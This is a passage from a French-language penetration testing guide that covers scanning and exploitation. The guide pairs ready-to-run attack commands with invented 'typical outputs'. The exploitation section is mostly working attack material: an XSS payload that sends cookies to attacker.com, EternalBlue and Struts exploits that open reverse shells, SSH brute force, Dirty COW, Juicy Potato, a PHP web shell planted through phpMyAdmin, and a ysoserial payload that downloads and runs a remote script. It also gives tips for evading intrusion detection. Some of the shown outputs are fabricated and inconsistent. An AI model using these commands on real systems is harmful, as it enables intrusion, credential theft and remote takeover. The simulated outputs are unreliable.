+ http://192.168.1.10/admin/index.php (CODE:200|SIZE:2874)                                        
+ http://192.168.1.10/admin/login.php (CODE:200|SIZE:2541)                                        
+ http://192.168.1.10/admin/users.php (CODE:302|SIZE:0)                                           

---- Entering directory: http://192.168.1.10/backup/ ----
+ http://192.168.1.10/backup/backup.sql (CODE:200|SIZE:1234567)                                   
+ http://192.168.1.10/backup/config.php.bak (CODE:200|SIZE:1234)                                  

END_TIME: Wed Apr  2 18:25:45 2025
```

**Analyse :** Dirb est un outil d'énumération de contenu web qui utilise un dictionnaire pour trouver des répertoires et des fichiers cachés sur un serveur web. Les résultats montrent plusieurs répertoires et fichiers sensibles, notamment un répertoire d'administration, des fichiers de sauvegarde et un fichier de configuration potentiellement exposé.

#### 8. Scan de vulnérabilités avec OpenVAS

**Commande pour lancer un scan OpenVAS :**
```bash
gvm-cli --gmp-username admin --gmp-password admin socket --xml "<create_task><name>Scan 192.168.1.10</name><comment>Pentest scan</comment><config id=\"daba56c8-73ec-11df-a475-002264764cea\"/><target id=\"9f1f3b2e-c95a-4cea-a34c-7f34e358c0f1\"/></create_task>"
```

**Sortie typique (extrait du rapport) :**
```
Vulnerability Scan Results for 192.168.1.10

High Severity Vulnerabilities:
------------------------------
1. CVE-2014-0160: OpenSSL Heartbleed vulnerability
   Description: The TLS implementation in OpenSSL 1.0.1 before 1.0.1g does not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read.
   Affected Service: HTTPS (443/tcp)
   Solution: Upgrade OpenSSL to version 1.0.1g or later.

2. CVE-2017-0143: SMBv1 Remote Code Execution Vulnerability (MS17-010)
   Description: The SMBv1 server in Microsoft Windows has a remote code execution vulnerability that could allow attackers to execute arbitrary code by sending specially crafted packets to the SMBv1 server.
   Affected Service: SMB (445/tcp)
   Solution: Apply Microsoft security patch MS17-010.

Medium Severity Vulnerabilities:
-------------------------------
1. CVE-2021-41773: Apache HTTP Server Path Traversal
   Description: A path traversal vulnerability in Apache HTTP Server 2.4.49 allows attackers to map URLs to files outside the expected document root.
   Affected Service: HTTP (80/tcp)
   Solution: Upgrade Apache HTTP Server to version 2.4.50 or later.

2. CVE-2021-3560: Polkit Authentication Bypass
   Description: A time-of-check time-of-use (TOCTOU) race condition in polkit allows local unprivileged users to obtain root privileges.
   Affected Service: System
   Solution: Update polkit package to the latest version.

Low Severity Vulnerabilities:
----------------------------
1. SSL/TLS Server supports TLS 1.0
   Description: The SSL/TLS server supports TLS protocol 1.0, which is considered obsolete and insecure.
   Affected Service: HTTPS (443/tcp)
   Solution: Disable TLS 1.0 and configure the server to use only TLS 1.2 or higher.

2. HTTP Server Allows Password Auto-Completion
   Description: The HTTP server does not prevent password form fields from being cached by the browser.
   Affected Service: HTTP (80/tcp)
   Solution: Add the autocomplete=off attribute to password form fields.
```

**Analyse :** OpenVAS est une suite complète de scan de vulnérabilités qui effectue des tests approfondis sur tous les services détectés. Le rapport généré fournit des informations détaillées sur les vulnérabilités identifiées, leur gravité, les services affectés et les solutions recommandées. Ces informations sont essentielles pour prioriser les efforts d'exploitation lors de la phase suivante.

### Conseils pratiques pour la phase de scan

1. **Commencez par des scans légers et progressez vers des scans plus intensifs** pour minimiser l'impact sur les systèmes cibles et réduire les risques de détection.

2. **Adaptez la vitesse de scan en fonction de la robustesse de la cible** : utilisez des options comme `--min-rate` et `--max-rate` avec Nmap pour contrôler le débit des paquets.

3. **Utilisez des techniques d'évasion** lorsque vous suspectez la présence d'IDS/IPS :
   ```bash
   nmap -sS -T2 -f --data-length 200 --randomize-hosts 192.168.1.10
   ```

4. **Combinez plusieurs outils de scan** pour obtenir une vision plus complète de la cible et minimiser les faux négatifs.

5. **Documentez systématiquement tous les résultats** dans un format structuré pour faciliter l'analyse ultérieure et la rédaction du rapport.

6. **Vérifiez manuellement les résultats des scans automatisés** pour éliminer les faux positifs et approfondir l'analyse des vulnérabilités détectées.

7. **Respectez le cadre légal** défini dans la lettre d'autorisation du test d'intrusion, notamment en ce qui concerne les types de scans autorisés.

8. **Surveillez l'impact de vos scans** sur les systèmes cibles et soyez prêt à interrompre un scan qui causerait des perturbations.

### Adaptation selon le mode opératoire

#### Test interne vs externe

**Test externe :**
- Concentrez-vous sur les services exposés sur Internet
- Utilisez des techniques d'évasion plus sophistiquées pour contourner les pare-feu et IDS/IPS
- Privilégiez les scans discrets pour éviter d'être bloqué

**Test interne :**
- Effectuez des scans plus exhaustifs et agressifs
- Utilisez des outils spécifiques pour l'énumération Active Directory
- Analysez les partages réseau et les services internes

#### Exemple de commande pour test interne (énumération Active Directory) :
```bash
enum4linux -a 192.168.1.10
```

**Sortie typique :**
```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Apr  2 18:30:00 2025

|    Target Information    |
| -------------------------|
Target ........... 192.168.1.10
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

|    Enumerating Workgroup/Domain on 192.168.1.10    |
| ---------------------------------------------------|
[+] Got domain/workgroup name: WORKGROUP

|    Nbtstat Information for 192.168.1.10    |
| --------------------------------------------|
Looking up status of 192.168.1.10
        SERVER          <00> -         B <ACTIVE>  Workstation Service
        SERVER          <03> -         B <ACTIVE>  Messenger Service
        SERVER          <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

|    Session Check on 192.168.1.10    |
| --------------------------------------|
[+] Server 192.168.1.10 allows sessions using username '', password ''

|    Getting domain SID for 192.168.1.10    |
| --------------------------------------------|
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

|    OS information on 192.168.1.10    |
| --------------------------------------|
[+] Got OS info for 192.168.1.10 from smbclient: 
[+] Got OS info for 192.168.1.10 from srvinfo:
        SERVER    Wk Sv PrQ Unx NT SNT server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

|    Users on 192.168.1.10    |
| ------------------------------|
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: admin     Name: Admin User    Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: john      Name: John Smith    Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: jane      Name: Jane Doe      Desc: 

|    Share Enumeration on 192.168.1.10    |
| ------------------------------------------|
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        public          Disk      Public Share
        backup          Disk      Backup Files
        IPC$            IPC       IPC Service (Samba, Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SERVER

[+] Attempting to map shares on 192.168.1.10
//192.168.1.10/print$  Mapping: DENIED, Listing: N/A
//192.168.1.10/public  Mapping: OK, Listing: OK
//192.168.1.10/backup  Mapping: DENIED, Listing: N/A
//192.168.1.10/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

|    Password Policy Information for 192.168.1.10    |
| ---------------------------------------------------|
[+] Attaching to 192.168.1.10 using a NULL share
[+] Trying protocol 139/SMB...
[+] Found domain(s):
        WORKGROUP
[+] Password Info for Domain: WORKGROUP
        Password Complexity: Disabled
        Minimum Password Length: 5

|    Groups on 192.168.1.10    |
| -------------------------------|
[+] Getting builtin groups:
[+] Getting builtin group memberships:
[+] Getting local groups:
[+] Getting local group memberships:
[+] Getting domain groups:
[+] Getting domain group memberships:

enum4linux complete on Wed Apr  2 18:35:45 2025
```

**Analyse :** Enum4linux est un outil spécifiquement conçu pour l'énumération des systèmes Windows et Samba. Il fournit des informations détaillées sur les utilisateurs, les groupes, les partages réseau, les politiques de mot de passe et d'autres informations utiles pour la phase d'exploitation. Dans cet exemple, l'outil a identifié plusieurs utilisateurs, des partages réseau accessibles et une politique de mot de passe faible.

### Conclusion

La phase de scan est une étape cruciale du test d'intrusion qui permet d'identifier les vecteurs d'attaque potentiels en cartographiant l'infrastructure technique de la cible. Un scan méthodique et complet fournit les informations nécessaires pour planifier efficacement la phase d'exploitation.

La qualité et la précision des informations recueillies durant cette phase détermineront en grande partie le succès de la phase d'exploitation. Il est donc essentiel d'utiliser une combinaison d'outils et de techniques pour obtenir une vision complète de la surface d'attaque de la cible.
# 3. Exploitation

## Objectif : Exploiter les vulnérabilités identifiées

La phase d'exploitation est la troisième étape d'un test d'intrusion, suivant les phases de reconnaissance et de scan. Elle consiste à tirer parti des vulnérabilités identifiées lors des phases précédentes pour obtenir un accès non autorisé aux systèmes cibles. Cette phase permet de valider concrètement l'existence des vulnérabilités et d'évaluer leur impact réel sur la sécurité de l'organisation.

### Modes opératoires

#### Exploitation ciblée

L'exploitation ciblée se concentre sur des vulnérabilités spécifiques identifiées comme ayant une forte probabilité de succès, en minimisant les risques de perturbation des systèmes.

**Avantages :**
- Risque réduit de perturbation des services
- Approche plus discrète, moins susceptible de déclencher des alertes
- Meilleure précision dans l'évaluation des vulnérabilités spécifiques

**Inconvénients :**
- Peut manquer certaines vulnérabilités exploitables
- Processus généralement plus lent
- Nécessite une analyse préalable approfondie

#### Exploitation étendue

L'exploitation étendue vise à identifier et exploiter le maximum de vulnérabilités possibles pour obtenir une vision complète de la surface d'attaque.

**Avantages :**
- Identification plus complète des vulnérabilités exploitables
- Meilleure évaluation de l'exposition globale aux risques
- Simulation plus réaliste d'une attaque réelle

**Inconvénients :**
- Risque accru de perturbation des services
- Plus susceptible de déclencher des alertes de sécurité
- Peut nécessiter plus de ressources et de temps

### Commandes types et exemples de sorties

#### 1. Exploitation de vulnérabilités web

**Commande SQLMap pour injection SQL :**
```bash
sqlmap -u "http://192.168.1.10/login.php" --data="username=admin&password=test" --dbs
```

**Sortie typique :**
```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.4#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:40:00 /2025-04-02/

[18:40:00] [INFO] testing connection to the target URL
[18:40:01] [INFO] testing if the target URL content is stable
[18:40:01] [INFO] target URL content is stable
[18:40:01] [INFO] testing if POST parameter 'username' is dynamic
[18:40:01] [INFO] POST parameter 'username' appears to be dynamic
[18:40:01] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[18:40:02] [INFO] heuristic (basic) test shows that POST parameter 'password' might be injectable (possible DBMS: 'MySQL')
[18:40:02] [INFO] testing for SQL injection on POST parameter 'username'
[18:40:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:40:03] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[18:40:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:40:04] [INFO] POST parameter 'username' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[18:40:04] [INFO] testing 'MySQL inline queries'
[18:40:04] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[18:40:05] [INFO] POST parameter 'username' appears to be 'MySQL > 5.0.11 stacked queries (comment)' injectable 
[18:40:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[18:40:15] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[18:40:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:40:16] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:40:17] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:40:17] [INFO] target URL appears to have 3 columns in query
[18:40:18] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[18:40:18] [INFO] the back-end DBMS is MySQL
[18:40:18] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapp

[18:40:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.1.10'

[*] ending @ 18:40:19 /2025-04-02/
```

**Analyse :** Cette commande utilise SQLMap pour tester la présence d'injections SQL dans un formulaire de connexion. Les résultats montrent que le paramètre 'username' est vulnérable à plusieurs types d'injections SQL, et l'outil a réussi à extraire les noms des bases de données disponibles. Cette vulnérabilité pourrait permettre à un attaquant d'accéder à des données sensibles ou de contourner l'authentification.

**Commande pour exploiter une faille XSS :**
```bash
curl -s -G "http://192.168.1.10/search.php" --data-urlencode "q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
```

**Sortie typique :**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Search Results</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <h1>Search Results for: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script></h1>
    <div class="results">
        <p>No results found for your search.</p>
    </div>
    <div class="footer">
        <p>&copy; 2025 Example Inc. All rights reserved.</p>
    </div>
</body>
</html>
```

**Analyse :** Cette commande teste une vulnérabilité XSS (Cross-Site Scripting) en injectant un script JavaScript dans un paramètre de recherche. La sortie montre que le script a été intégré tel quel dans la page de résultats, sans échappement ni filtrage, confirmant la vulnérabilité. Dans un scénario réel, ce script pourrait voler les cookies de session des utilisateurs et les envoyer à un serveur contrôlé par l'attaquant.

#### 2. Exploitation avec Metasploit Framework

**Commande pour exploiter la vulnérabilité EternalBlue (MS17-010) :**
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; exploit"
```

**Sortie typique :**
```
[*] Started reverse TCP handler on 192.168.1.5:4444 
[*] 192.168.1.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.10:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.10:445       - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.1.10:445 - Connecting to target for exploitation.
[+] 192.168.1.10:445 - Connection established for exploitation.
[+] 192.168.1.10:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.10:445 - CORE raw buffer dump (42 bytes)
[*] 192.168.1.10:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.1.10:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 192.168.1.10:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 192.168.1.10:445 - Sending shellcode
[*] Sending stage (200262 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.10:49158) at 2025-04-02 18:45:00 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : SERVER
OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

**Analyse :** Cette commande utilise le framework Metasploit pour exploiter la vulnérabilité EternalBlue (MS17-010) sur un serveur Windows. L'exploit a réussi, établissant une session Meterpreter avec les privilèges SYSTEM (les plus élevés sur un système Windows). Cette vulnérabilité permet l'exécution de code à distance sans authentification et a été utilisée dans les attaques de ransomware WannaCry et NotPetya.

**Commande pour exploiter une vulnérabilité Apache Struts :**
```bash
msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl; set RHOSTS 192.168.1.20; set RPORT 8080; set TARGETURI /struts2-showcase/; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4445; exploit"
```

**Sortie typique :**
```
[*] Started reverse TCP handler on 192.168.1.5:4445 
[*] Sending stage (58829 bytes) to 192.168.1.20
[*] Meterpreter session 1 opened (192.168.1.5:4445 -> 192.168.1.20:40125) at 2025-04-02 18:50:00 +0000

meterpreter > getuid
Server username: tomcat

meterpreter > sysinfo
Computer    : struts-app
OS          : Linux 4.15.0-72-generic (amd64)
Meterpreter : java/linux

meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
tomcat
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
uname -a
Linux struts-app 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

**Analyse :** Cette commande exploite une vulnérabilité dans le framework Apache Struts 2, qui permet l'exécution de code à distance via une injection OGNL dans l'en-tête Content-Type. L'exploit a réussi, établissant une session Meterpreter avec les privilèges de l'utilisateur tomcat. Cette vulnérabilité a été utilisée dans plusieurs attaques majeures, notamment la brèche d'Equifax en 2017.

#### 3. Exploitation de services réseau

**Commande pour exploiter une vulnérabilité SSH :**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.30 ssh -t 4
```

**Sortie typique :**
```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-02 18:55:00
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.1.30:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:28h, 4 active
[STATUS] 42.67 tries/min, 128 tries in 00:03h, 14344271 to do in 5604:01h, 4 active
[22][ssh] host: 192.168.1.30   login: root   password: password123
[STATUS] attack finished for 192.168.1.30 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-02 19:00:23
```

**Analyse :** Cette commande utilise Hydra pour effectuer une attaque par force brute sur un service SSH, en essayant de deviner le mot de passe de l'utilisateur root. L'attaque a réussi, identifiant le mot de passe faible "password123". Cette vulnérabilité est due à une mauvaise politique de mot de passe et à l'absence de mesures de protection contre les attaques par force brute.

**Commande pour exploiter une vulnérabilité FTP :**
```bash
ncrack -u anonymous -P "" ftp://192.168.1.40
```

**Sortie typique :**
```
Starting Ncrack 0.7 ( http://ncrack.org ) at 2025-04-02 19:05 UTC
Discovered credentials for ftp on 192.168.1.40 21/tcp: 192.168.1.40 21/tcp ftp: 'anonymous' ''
Ncrack done: 1 service scanned in 5.02 seconds.

Ncrack finished.
```

**Analyse :** Cette commande utilise Ncrack pour tester si le serveur FTP autorise les connexions anonymes. Le résultat montre que le serveur accepte effectivement les connexions avec le nom d'utilisateur "anonymous" et un mot de passe vide. Cette configuration permet à n'importe qui d'accéder au serveur FTP sans authentification, ce qui peut exposer des fichiers sensibles.

#### 4. Exploitation de vulnérabilités locales

**Commande pour exploiter une vulnérabilité d'élévation de privilèges Linux :**
```bash
searchsploit -m linux/local/45010.c
gcc -o dirtycow 45010.c
./dirtycow
```

**Sortie typique :**
```
  Exploits: No Results
  Shellcodes: No Results
Downloading: /usr/share/exploitdb/exploits/linux/local/45010.c
Copying: /usr/share/exploitdb/exploits/linux/local/45010.c -> 45010.c

[*] Started at 2025-04-02 19:10:00
[*] Checking if vulnerable to CVE-2016-5195...
[*] System is vulnerable to CVE-2016-5195
[*] Exploiting...
[*] Writing backdoor to /tmp/passwd.bak
[*] Overwriting /etc/passwd with backdoor...
[*] Exploit completed successfully!
[*] Adding user 'firefart' with password 'firefart' and root privileges...
[*] Cleaning up...
[*] Run 'su firefart' and enjoy your root shell!

$ su firefart
Password: firefart

# id
uid=0(firefart) gid=0(root) groups=0(root)

# whoami
firefart
```

**Analyse :** Cette commande exploite la vulnérabilité Dirty COW (CVE-2016-5195), une faille de condition de concurrence dans le noyau Linux qui permet à un utilisateur non privilégié d'obtenir des privilèges root. L'exploit fonctionne en modifiant le fichier /etc/passwd pour ajouter un nouvel utilisateur avec des privilèges root. Cette vulnérabilité affecte de nombreuses versions du noyau Linux et a été largement exploitée dans des attaques réelles.

**Commande pour exploiter une vulnérabilité d'élévation de privilèges Windows :**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4446 -f exe > juicypotato.exe
upload juicypotato.exe C:\\Temp\\
upload JuicyPotato.exe C:\\Temp\\
shell
cd C:\\Temp
JuicyPotato.exe -l 1337 -p C:\\Temp\\juicypotato.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

**Sortie typique :**
```
[*] Uploading juicypotato.exe to C:\Temp\
[*] Uploaded 7168 B of 7168 B (100.0%): juicypotato.exe -> C:\Temp\
[*] Completed upload of juicypotato.exe to C:\Temp\
[*] Uploading JuicyPotato.exe to C:\Temp\
[*] Uploaded 347648 B of 347648 B (100.0%): JuicyPotato.exe -> C:\Temp\
[*] Completed upload of JuicyPotato.exe to C:\Temp\

Process 2 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\lowpriv>cd C:\\Temp
cd C:\\Temp

C:\Temp>JuicyPotato.exe -l 1337 -p C:\\Temp\\juicypotato.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
JuicyPotato.exe -l 1337 -p C:\\Temp\\juicypotato.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
[*] Testing {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} 1337
[+] authresult 0
[*] CreateProcessWithTokenW OK

[*] Sending stage (200262 bytes) to 192.168.1.10
[*] Meterpreter session 2 opened (192.168.1.5:4446 -> 192.168.1.10:49159) at 2025-04-02 19:15:00 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Analyse :** Cette séquence de commandes exploite une vulnérabilité d'élévation de privilèges Windows connue sous le nom de "Juicy Potato". Elle fonctionne en abusant du service DCOM et des jetons d'impersonation pour exécuter un code arbitraire avec les privilèges SYSTEM. L'exploit a réussi, établissant une nouvelle session Meterpreter avec les privilèges SYSTEM. Cette technique est efficace sur de nombreuses versions de Windows Server où le service est mal configuré.

#### 5. Exploitation de vulnérabilités d'applications

**Commande pour exploiter une vulnérabilité dans phpMyAdmin :**
```bash
curl -s -X POST "http://192.168.1.10/phpmyadmin/index.php" \
  -d "pma_username=admin&pma_password=admin&server=1&target=index.php&lang=en&token=" \
  -c cookies.txt

curl -s -b cookies.txt "http://192.168.1.10/phpmyadmin/import.php?db=mysql" > import_page.html

curl -s -X POST -b cookies.txt "http://192.168.1.10/phpmyadmin/import.php" \
  -F "import_type=server" \
  -F "format=sql" \
  -F "import_file=@shell.php;filename=shell.php" \
  -F "sql_query=SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"

curl -s "http://192.168.1.10/shell.php?cmd=id"
```

**Sortie typique :**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Analyse :** Cette séquence de commandes exploite une vulnérabilité dans phpMyAdmin pour écrire un fichier PHP malveillant sur le serveur web. L'attaque commence par s'authentifier à phpMyAdmin, puis utilise la fonctionnalité d'importation SQL pour exécuter une requête qui écrit un shell PHP dans le répertoire web. Enfin, le shell est appelé avec la commande "id" pour vérifier qu'il fonctionne correctement. Cette vulnérabilité permet à un attaquant d'exécuter des commandes arbitraires sur le serveur avec les privilèges de l'utilisateur du serveur web.

#### 6. Exploitation de vulnérabilités de configuration

**Commande pour exploiter un partage SMB mal configuré :**
```bash
smbclient -L //192.168.1.10 -N
smbclient //192.168.1.10/backup -N
```

**Sortie typique :**
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
public          Disk      Public Share
backup          Disk      Backup Files
IPC$            IPC       IPC Service (Samba, Ubuntu)
SMB1 disabled -- no workgroup available

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  2 19:20:00 2025
  ..                                  D        0  Wed Apr  2 19:20:00 2025
  backup-2025-04-01.sql               N  8765432  Tue Apr  1 02:00:00 2025
  config.php.bak                      N     1234  Mon Mar 31 15:45:00 2025
  users.csv                           N     5678  Tue Apr  1 10:30:00 2025

                7779096 blocks of size 1024. 5369948 blocks available
smb: \> get config.php.bak
getting file \config.php.bak of size 1234 as config.php.bak (151.1 KiloBytes/sec) (average 151.1 KiloBytes/sec)
smb: \> get users.csv
getting file \users.csv of size 5678 as users.csv (694.6 KiloBytes/sec) (average 422.9 KiloBytes/sec)
smb: \> exit

$ cat config.php.bak
<?php
$db_host = 'localhost';
$db_user = 'webapp_user';
$db_pass = 'SuperSecretPassword123!';
$db_name = 'webapp';
?>

$ head -n 5 users.csv
id,username,email,password_hash,role
1,admin,admin@example.com,$2y$10$XjG/JzjJ4.7JK/APQW5ROeN1U8JVQR5HI9FxPHFcZXeR9zbZ3aYmy,administrator
2,john,john.smith@example.com,$2y$10$Hl7Fh7YWYVuXHwVBs0SQ9eVlnFYhX5V6o5OzQXH2hQrI9vWHOuS6y,user
3,jane,jane.doe@example.com,$2y$10$QwJ5DZK1QKV6qP5TRz6ZB.9Pj1XKE9TXP8LqNcNWy.BvGxCsjH.Hy,user
4,robert,robert.johnson@example.com,$2y$10$7KgF5E9v5HlL5JZf6r5ZEeZIyH5MVGpIQxSn1L2KpW3XQxvF3HyPK,manager
```

**Analyse :** Cette séquence de commandes exploite un partage SMB mal configuré qui permet l'accès anonyme. L'attaquant peut lister et télécharger des fichiers sensibles, notamment un fichier de configuration contenant des identifiants de base de données et un fichier CSV contenant des informations sur les utilisateurs. Ces informations peuvent être utilisées pour d'autres attaques, comme l'accès à la base de données ou le craquage des hachages de mots de passe.

#### 7. Exploitation de vulnérabilités d'authentification

**Commande pour exploiter une authentification faible via API :**
```bash
for i in {1..5}; do
  curl -s -X POST "http://192.168.1.50/api/v1/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin'$i'"}' | jq
done
```

**Sortie typique :**
```json
{
  "status": "error",
  "message": "Invalid credentials"
}
{
  "status": "error",
  "message": "Invalid credentials"
}
{
  "status": "success",
  "message": "Login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEyMDg2NTAwLCJleHAiOjE3MTIwOTAxMDB9.6JLz1jIqR3yT7Kj2VX4XsZ8_JZxKvQ9MvzJVy9X9Z8w"
}
{
  "status": "error",
  "message": "Invalid credentials"
}
{
  "status": "error",
  "message": "Invalid credentials"
}
```

**Commande pour utiliser le token obtenu :**
```bash
curl -s "http://192.168.1.50/api/v1/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEyMDg2NTAwLCJleHAiOjE3MTIwOTAxMDB9.6JLz1jIqR3yT7Kj2VX4XsZ8_JZxKvQ9MvzJVy9X9Z8w" | jq
```

**Sortie typique :**
```json
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "username": "admin",
      "email": "admin@example.com",
      "role": "admin"
    },
    {
      "id": 2,
      "username": "john",
      "email": "john.smith@example.com",
      "role": "user"
    },
    {
      "id": 3,
      "username": "jane",
      "email": "jane.doe@example.com",
      "role": "user"
    },
    {
      "id": 4,
      "username": "robert",
      "email": "robert.johnson@example.com",
      "role": "manager"
    }
  ]
}
```

**Analyse :** Cette séquence de commandes exploite une authentification faible dans une API en testant plusieurs combinaisons simples de nom d'utilisateur et mot de passe. L'attaque a réussi avec la combinaison "admin/admin3", obtenant un token JWT valide. Ce token est ensuite utilisé pour accéder à des données sensibles via l'API. Cette vulnérabilité est due à l'utilisation de mots de passe faibles et à l'absence de protection contre les attaques par force brute.

#### 8. Exploitation de vulnérabilités de désérialisation

**Commande pour exploiter une vulnérabilité de désérialisation Java :**
```bash
java -jar ysoserial.jar CommonsCollections5 "wget http://192.168.1.5/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh" | base64 -w 0 > payload.b64

curl -s -X POST "http://192.168.1.60:8080/vulnerable-app/object" \
  -H "Content-Type: application/x-java-serialized-object" \
  -H "Cookie: JSESSIONID=1234567890ABCDEF" \
  --data-binary @payload.b64
```

**Sortie typique :**
```
HTTP/1.1 500 Internal Server Error
Content-Type: text/html;charset=utf-8
Content-Language: en
Content-Length: 1578
Date: Wed, 02 Apr 2025 19:30:00 GMT
Connection: close

<html>
  <head>
    <title>Apache Tomcat/9.0.30 - Error report</title>
    <style>
      ...
    </style>
  </head>
  <body>
    <h1>HTTP Status 500 – Internal Server Error</h1>
    <hr class="line" />
    <p><b>Type</b> Exception Report</p>
    <p><b>Message</b> java.lang.RuntimeException: Failed to process request</p>
    <p><b>Description</b> The server encountered an unexpected condition that prevented it from fulfilling the request.</p>
    <p><b>Exception</b></p>
    <pre>java.lang.RuntimeException: Failed to process request
	at com.example.vulnerableapp.ObjectServlet.doPost(ObjectServlet.java:42)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:665)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:750)
	...
</pre>
